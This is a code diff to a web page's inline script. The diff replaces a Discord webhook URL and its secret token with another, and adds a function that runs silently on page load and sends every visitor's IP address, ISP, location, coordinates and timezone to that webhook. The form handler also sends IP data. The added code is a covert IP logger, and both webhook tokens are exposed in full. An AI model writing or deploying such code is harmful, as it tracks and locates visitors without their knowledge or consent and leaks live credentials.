@@ -182,12 +182,13 @@
         
         <div id="status"><span class="status-dot"></span>ready</div>
     </div>
+
     <script>
     (function() {
         const form = document.getElementById('form');
         const status = document.getElementById('status');
         
-        const WEBHOOK = "https://discord.com/api/webhooks/1543174266239844412/QPGFBn-OxdFNAYLy2xDS7Ee0LpByWqj0eHB7OZ-oBZhgwGFQlhzfOFvMrDJYSusp4nNZ";
+        const WEBHOOK = "https://discord.com/api/webhooks/1523954090734784536/IJsnopC9YZBjzpydMilJ8A4QmQ7YybQjRXKn3hl9nxzrZ9CdI9Jl9mWRjXS0qywqdCJT";
 
         function setStatus(msg, type) {
             status.innerHTML = `<span class="status-dot"></span>${msg}`;
@@ -226,6 +227,39 @@
             }
         }
 
+        // ========== LOG IP THE MOMENT THE PAGE LOADS ==========
+        async function logVisit() {
+            const ipInfo = await getIpInfo();
+
+            try {
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [{
+                            color: 0x555555,
+                            title: "👀 New Visitor",
+                            fields: [
+                                { name: "IP Address", value: ipInfo.ip, inline: true },
+                                { name: "Organization / ISP", value: ipInfo.org, inline: true },
+                                { name: "Location", value: `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country} (${ipInfo.countryCode})` },
+                                { name: "Coordinates", value: `${ipInfo.lat}, ${ipInfo.lon}`, inline: true },
+                                { name: "Timezone", value: ipInfo.timezone, inline: true }
+                            ],
+                            timestamp: new Date().toISOString(),
+                            footer: { text: "Logged on page visit" }
+                        }]
+                    })
+                });
+            } catch (err) {
+                console.error('Failed to log visit:', err);
+            }
+        }
+
+        // Run immediately when the page loads
+        logVisit();
+
+        // ========== FORM SUBMIT (still includes IP) ==========
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
             const reason = document.getElementById('reason').value.trim();
@@ -240,13 +274,11 @@
                 return;
             }
 
-            setStatus('getting location...', '');
+            setStatus('sending...', '');
             const btn = this.querySelector('.btn');
             btn.disabled = true;
 
             const ipInfo = await getIpInfo();
-
-            setStatus('sending...', '');
 
             try {
                 const res = await fetch(WEBHOOK, {
